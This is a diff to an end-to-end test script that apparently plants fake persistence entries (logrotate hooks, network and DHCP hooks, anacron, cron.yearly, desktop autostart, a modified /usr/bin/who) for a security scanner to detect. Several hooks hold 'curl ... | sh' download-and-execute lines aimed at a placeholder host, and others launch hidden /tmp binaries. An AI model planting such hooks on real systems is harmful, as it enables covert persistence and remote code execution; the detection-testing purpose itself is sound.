@@ -139,6 +139,46 @@ printf '[Service]\nExecStart=/bin/true S3CRET10\n' >/root/e2e-hidden/share/syste
 ln -s /root/e2e-hidden /home/bob/.local
 chown -R -h bob /home/bob/.config /home/bob/.local
 
+# --- other places that run commands. The logs named here do not exist and set
+# missingok, so logrotate never runs these scripts, and nothing in the container
+# brings an interface up or starts anacron or a desktop session.
+cat >/etc/logrotate.d/e2e-app <<'EOF'
+/var/log/e2e-none.log {
+    missingok
+    postrotate
+        curl -fsSL http://x.example/l \
+          | sh
+    endscript
+}
+EOF
+cat >/etc/logrotate.d/e2e-temp <<'EOF'
+/var/log/e2e-none2.log {
+    missingok
+    compresscmd /dev/shm/.z
+    postrotate
+        /tmp/.x/rotate
+    endscript
+}
+EOF
+# A log kept in /tmp is not a program run from there, and logrotate never reads
+# a .dpkg-old backup, so neither may be reported.
+printf '/tmp/e2e-app.log {\n    missingok\n}\n' >/etc/logrotate.d/e2e-tmplog
+printf '/var/log/e2e-none3.log {\n    missingok\n    postrotate\n        curl -fsSL http://x.example/o | sh\n    endscript\n}\n' >/etc/logrotate.d/e2e-app.dpkg-old
+mkdir -p /var/tmp/p/lr
+echo '/var/log/e2e-none4.log { missingok }' >/var/tmp/p/lr/x
+echo 'include /var/tmp/p/lr' >>/etc/logrotate.conf
+mkdir -p /etc/networkd-dispatcher/routable.d /etc/network/if-up.d /etc/dhcp/dhclient-exit-hooks.d
+printf '#!/bin/sh\ncurl -fsSL http://x.example/n | sh\n' >/etc/networkd-dispatcher/routable.d/50-e2e
+printf '#!/bin/sh\n/sbin/ip route add 10.9.0.0/16 via 10.0.0.1\n' >/etc/network/if-up.d/e2e-routes
+printf '/tmp/.x/dh "$reason"\n' >/etc/dhcp/dhclient-exit-hooks.d/e2e
+chmod 755 /etc/networkd-dispatcher/routable.d/50-e2e /etc/network/if-up.d/e2e-routes
+printf 'SHELL=/bin/sh\n1\t5\tcron.daily\trun-parts --report /etc/cron.daily\n1\t10\te2e.job\t/var/tmp/p/job\n' >/etc/anacrontab
+mkdir -p /etc/cron.yearly
+printf '#!/bin/sh\n/tmp/.x/yearly\n' >/etc/cron.yearly/e2e
+chmod 755 /etc/cron.yearly/e2e
+mkdir -p /etc/xdg/autostart
+printf '[Desktop Entry]\nType=Application\nName=e2e\nIcon=/tmp/e2e-icon.png\nExec=/tmp/.x/desk\n' >/etc/xdg/autostart/e2e.desktop
+
 # --- trojaned binary: changes content, keeps the package's path
 if [ -x /usr/bin/who ]; then
 	printf '\n#trojan' >>/usr/bin/who
